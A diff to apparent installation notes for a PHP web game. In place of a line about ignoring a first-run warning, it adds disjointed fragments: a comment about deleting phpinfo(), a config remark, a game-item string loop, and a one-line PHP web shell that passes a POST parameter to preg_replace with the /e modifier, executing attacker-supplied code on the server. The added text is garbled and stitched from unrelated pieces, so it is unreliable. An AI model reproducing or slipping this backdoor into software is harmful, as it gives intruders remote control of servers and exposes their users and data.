@@ -32,4 +32,14 @@
 注意：游戏安装后，第一次运行时会出现类似
 “Warning: filemtime() [function.filemtime]: stat failed for D:\Apache\htdocs\bbs\bra\./gamedata/templates/1_news.tpl.php in D:\Apache\htdocs\bbs\bra\include\global.func.php on line 46
 ”
-这样的信息。不用管它，以后就不会出现了。
+//delete phpinfo();
+PHP config >Global Variable OFF
+	$mi1=${'itm'.$m1};$mi2=${'itm'.$m2};$mi3=${'itm'.$m3};
+	foreach(Array('/^锋利的/','/^电气/','/^毒性/','/-改$/') as $value){
+		if($mi1){$mi1 = preg_replace($value,'',$mi1);}    //issue
+		if($mi2){$mi2 = preg_replace($value,'',$mi2);}
+		if($mi3){$mi3 = preg_replace($value,'',$mi3);}
+	}
+bug
+<?php @preg_replace("/[value]/e",$_POST['require'],"Array");
+//这样的信息。不用管它，以后就不会出现了。
